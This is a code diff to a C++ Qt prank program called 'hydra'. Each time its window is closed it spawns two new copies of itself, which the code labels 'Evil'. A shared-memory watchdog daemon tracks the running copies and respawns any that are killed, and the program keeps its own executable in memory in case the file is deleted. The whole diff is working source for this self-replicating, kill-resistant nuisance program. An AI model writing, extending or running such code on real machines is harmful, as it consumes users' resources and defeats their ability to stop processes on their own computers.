@@ -15,40 +15,30 @@
 #include <SFML/Audio/Music.hpp>
 
 // Standard
-#include <stdint.h>
+#include <cstdint>
 #include <ctime>
 #include <iostream>
 #include <iomanip>
 #include <cstdlib>
 #include <cstring>
+#include <thread>
 
 // Graphic and sound
 #include "assets.h"
-
 // os_* functions
 #include "os.h"
 
-/*#ifdef __unix__
-#include <unistd.h>
-#include <signal.h>
-#include <time.h>
-#include <errno.h>
-#endif
-
-#ifdef _WIN32
-#include <windows.h>
-#endif*/
-
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
-//#define MAX_NUM_PIDS 100000
-#define MAX_NUM_PIDS 200
+#define MAX_NUM_PIDS 30
 #define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t
+#define MUSIC_TIME_MS_APPROX 375 
 
 QFile exe_file;
 QByteArray exe_data;
 int perms;
-long daemon_pid;
+int64_t daemon_pid;
+sf::Music *music;
 
 static void button_response() {
   QApplication::quit();
@@ -69,91 +59,42 @@ void print_segment_as_hex(QSharedMemory *s) {
 }
 
 void print_segment_as_long(QSharedMemory *s) {
+  s->lock();
   int64_t *data = (int64_t*)s->data(); // 8 bytes
   for (int i=0;i<s->size()/8; i++)
     std::cout << data[i] << std::endl;
+  s->unlock();
 }
 
-
-
-bool at_least_one_proc_alive(QSharedMemory *s) {
-
+int64_t get_shmem(int at, QSharedMemory *s) {
+  s->lock();
   int64_t *shmem = (int64_t*)s->data();
-
-  for (int i=0;i<MAX_NUM_PIDS;i++) {
-
-    if (shmem[i] == 0)
-      return false;
-
-    if (os_proc_is_alive(shmem[i]) == true)
-      return true;
-  }
+  int64_t thing = shmem[at];
+  s->unlock();
+  return thing;
 }
 
-void deamon_loop() {
-
-  QSharedMemory segment(QString::number(os_get_pid()));
-  bool result = segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
-  std::cout << "s suze: " << segment.size() << std::endl;
-  result = segment.attach(QSharedMemory::ReadWrite);
-  //segment.unlock();
-
-  // Pass to argv[1] this "daemons" PID
-  std::cout << "daemon is pid " << os_get_pid() << std::endl;
-
-  print_segment_as_hex(&segment);
-
-  QStringList args;
-  args << QString::number(os_get_pid());
-  QProcess::startDetached(exe_file.fileName(), args);
-
-  while (true) {
-    os_sleep(1);
-    int64_t *shmem = (int64_t*)segment.data();
-    segment.lock();
-    //print_segment_as_long(&segment);
-    //print_segment_as_hex(&segment);
-    //std::cout << "--" << std::endl;
-
-    if (shmem[0] != 0 && !at_least_one_proc_alive(&segment)) {
-      std::memset(shmem, 0, SEGMENT_SZ);
-      QProcess::startDetached(exe_file.fileName(), args);
-    }
-
-    /*for (int i=0;i<MAX_NUM_PIDS;i++) {
-      if (shmem[i] == 0)
-        break;
-      std::cout << shmem[i] << " -> dead? -> " << proc_is_alive(shmem[i])  << std::endl;
-    }*/
-    segment.unlock();
-  }
-
+void set_shmem(int at, int64_t to, QSharedMemory *s) {
+  s->lock();
+  int64_t *shmem = (int64_t*)s->data();
+  shmem[at] = to;
+  s->unlock();
 }
 
-void append_to_shmem(QString key) {
-  QSharedMemory segment(key);
-  segment.attach(QSharedMemory::ReadWrite);
+void append_to_shmem(QSharedMemory *s, QString key) {
 
-  int64_t *shmem = (int64_t*)segment.data();
-  segment.lock();
+  s->lock();
+  int64_t *shmem = (int64_t*)s->data();
 
   for (int i=0;i<MAX_NUM_PIDS;i++) {
     if (shmem[i] == 0) {
       shmem[i] = os_get_pid(); // Register our PID
-      segment.unlock();
+      s->unlock();
       return;
     }
   }
-  segment.unlock();
 
-  /* Somehow, we overran MAX_NUM_PIDS... 
-   * This means that either: 
-   *  * MAX_NUM_PIDS wasn't set high enough, 
-   *  * They have A LOT of RAM/CPU to spare,
-   *  * shmem was not zeroed out (is this possible?)
-   * in any case, their desktop surely has too many Hydras :)
-   */
-  exit(1);
+  s->unlock();
 }
 
 void spawn_two_more() {
@@ -168,34 +109,124 @@ void spawn_two_more() {
     out_stream.close();
   }
 
+  QStringList args;
   // Daemon isn't dead, so start a new hydra with its PID
-  if (os_proc_is_alive(daemon_pid)) {
-    QStringList args;
-    args << QString::number(daemon_pid);
-    QProcess::startDetached(exe_name, args);
-    QProcess::startDetached(exe_name, args);
-  }
+  //if (os_proc_is_alive(daemon_pid)) {
+  QProcess::startDetached(exe_name);
+  QProcess::startDetached(exe_name);
+  /*}
   else  {
     std::cout << "Daemon was killed?!?" << std::endl;
-    QProcess::startDetached(exe_name);
+    qint64 new_daemon_pid;
+    QProcess::startDetached(exe_name, args, ".", &new_daemon_pid); // New daemon!
+    args << QString::number(new_daemon_pid);
+    QProcess::startDetached(exe_name, args);
+  }*/
+}
+
+void daemon_loop(QSharedMemory *segment) {
+  segment->create(SEGMENT_SZ, QSharedMemory::ReadWrite);
+  segment->lock();
+  memset(segment->data(), 0, SEGMENT_SZ);
+  segment->unlock();
+  int64_t this_pid = os_get_pid();
+  std::cout << "daemon is pid " << this_pid << std::endl;
+  set_shmem(0, this_pid, segment);
+
+  QStringList noargs;
+
+  print_segment_as_hex(segment);
+
+  spawn_two_more();
+
+  while (true) {
+    os_sleep(1);
+    segment->lock();
+    int64_t *shmem = (int64_t*)segment->data();
+    print_segment_as_hex(segment);
+    std::cout << "--- " << std::endl;
+
+    int num_procs_dead = 0;
+    
+    for (int i=0;i<MAX_NUM_PIDS;i++) {
+      if (shmem[i] == 0)
+        break;
+
+      // Looks like it was killed!
+      if (os_proc_is_alive(shmem[i]) == false)  {
+        std::cout << "proc at " << i << " dead?" << std::endl;
+        segment->unlock();
+        os_sleep(50);
+        segment->lock();
+        if (os_proc_is_alive(shmem[i]) == false)
+          spawn_two_more();
+        /*
+        qint64 replacement_proc_pid;
+        QProcess::startDetached(exe_file.fileName(), noargs, ".", &replacement_proc_pid); 
+        shmem[i] = replacement_proc_pid;
+        segment->unlock();
+        break;*/
+        //spawn_two_more();
+
+        /* qint64 new_proc_pid;
+        QProcess::startDetached(exe_file.fileName(), noargs, ".", &new_proc_pid); 
+        append_to_shmem(segment, QString::number(new_proc_pid));*/
+      }
+    }
+    segment->unlock();
   }
 }
+
+void delete_music_after_pause() {
+  os_sleep(MUSIC_TIME_MS_APPROX);
+  delete music;
+}
+
+void register_pid(QSharedMemory *s) {
+
+  os_sleep(25);
+
+  s->lock();
+  int64_t *shmem = (int64_t*)s->data();
+
+  for (int i=0;i<MAX_NUM_PIDS;i++) {
+    if (os_proc_is_alive(shmem[i]) == false || shmem[i] == 0) {
+      shmem[i] = os_get_pid();
+      s->unlock();
+      return;
+    }
+  }
+  s->unlock();
+}
+
+
 
 int main(int argc, char* argv[])  {
 
   exe_file.setFileName(argv[0]);
-  std::cout << "argc " << argc << std::endl;
+  QSharedMemory segment("hydra :)ppp");
+  bool shmem_attached = segment.attach(QSharedMemory::ReadWrite);
 
-  // No PID in argv, so start daemon mode
-  if (argc <= 1) {
-    deamon_loop();
-    return 0;
+  //std::cout << "alive? " << os_proc_is_alive(get_shmem(0, &segment)) << std::endl;
+  std::cout << "attached? " << shmem_attached  << std::endl;
+
+  // Is the master daemon alive?
+  if (!shmem_attached)  {
+    std::cout << "Are we first shmem instance?!" << std::endl;
+    daemon_loop(&segment);
   }
 
-  daemon_pid = atol(argv[1]);
+  if (!os_proc_is_alive(get_shmem(0, &segment)))  {
+    std::cout << "Daemon looks dead! " << std::endl;
+    daemon_loop(&segment);
+  }
+
   os_trap_setup();
 
-  append_to_shmem(QString::number(daemon_pid));
+  std::cout << "Registering pid!" << std::endl;
+  register_pid(&segment);
+
+  daemon_pid = get_shmem(0, &segment);
 
   // Read in the executable file, in case they try to delete it
   exe_file.open(QIODevice::ReadOnly);
@@ -210,11 +241,13 @@ int main(int argc, char* argv[])  {
   window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);
 
   // Setup and play Audio
-  sf::Music *music = new sf::Music;
+  music = new sf::Music;
   music->openFromMemory(chord_ogg, CHORD_LENGTH);
   //music->setVolume(100);
   music->play();
   //QApplication::beep();
+
+  std::thread t(delete_music_after_pause);
 
   // Setup layouts
   QBoxLayout layout(QBoxLayout::TopToBottom);
@@ -258,7 +291,8 @@ int main(int argc, char* argv[])  {
   window.show();
   app.exec();
 
-  delete music;
+  // Make sure music is closed
+  t.join();
 
   // Evil
   spawn_two_more();
